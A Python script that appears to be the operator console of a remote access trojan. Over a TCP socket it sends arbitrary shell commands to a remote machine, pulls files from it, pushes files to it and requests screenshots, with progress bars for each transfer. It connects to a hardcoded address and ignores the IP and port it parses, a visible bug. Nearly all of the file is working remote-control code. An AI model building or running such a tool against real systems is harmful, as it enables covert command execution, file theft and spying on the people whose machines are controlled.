import os
import socket
import tqdm
import argparse
import time
import setproctitle


addr = "127.0.0.1"
port = 5678
buff_size = 1024 * 128
sep = "<SEP>"


def send_file(conn, filename):
    print(filename)
    if not os.path.exists(filename):
        print(f"File does not exist: {filename}")
        return

    file_size = os.stat(filename).st_size
    print(f"Sending: {filename}, size: {file_size}")
    conn.send(f"{filename}{sep}{file_size}".encode())

    time.sleep(2)
    progress = tqdm.tqdm(
        range(file_size),
        f"Sending: {filename}",
        unit="B",
        unit_scale=True,
        unit_divisor=1024,
    )
    with open(filename, "rb") as f:
        while True:
            file_chunk = f.read(buff_size)
            if not file_chunk:
                conn.sendall(b"done")
                break
            conn.sendall(file_chunk)
            progress.update(len(file_chunk))
            conn.recv(buff_size)

    print(f"file: {filename} sent successfully !!!")


def recv_file(conn):

    received = conn.recv(buff_size).decode()
    filename, file_size = received.split(sep)
    filename = os.path.basename(filename)
    file_size = int(file_size)

    progress = tqdm.tqdm(
        range(file_size),
        f"Received: {filename}",
        unit="B",
        unit_scale=True,
        unit_divisor=1024,
    )

    with open(filename, "wb") as f:
        while True:
            read_buff = conn.recv(buff_size)
            if b"done" in read_buff:
                f.write(read_buff.replace(b"done", b""))
                break
            f.write(read_buff)
            progress.update(len(read_buff))
            conn.send(b"ACK")
        # print(f"Recieved file: {filename}, with size: {file_size}")


def helper(s, conn, cwd):

    while True:
        msg = input(f"{cwd} $ >")
        if not msg.strip():
            continue

        elif msg.lower() == "exit":
            conn.send("exit".encode())
            break

        elif msg[:8] == "download":
            conn.send(msg.encode())
            recv_file(conn)
            continue

        elif msg[:6] == "upload":
            _, filename = msg.split()
            conn.send(_.encode())
            send_file(conn, filename)
            continue

        elif msg.lower() == "ss":
            conn.send("ss".encode())
            recv_file(conn)
            continue

        else:
            conn.send(msg.encode())
            otpt = conn.recv(buff_size).decode()
            if otpt == "ACK":
                otpt = conn.recv(buff_size).decode()
            res, cwd = otpt.rsplit(sep, 1)
            print(res)

    conn.close()
    s.close()


def main():

    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="Server IP address")
    parser.add_argument("port", type=int, help="Server port")
    args = parser.parse_args()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.connect((addr, port))
    cwd = s.recv(buff_size).decode()
    helper(s, s, cwd)

    # conn.close()
    s.close()


if __name__ == "__main__":
    main()
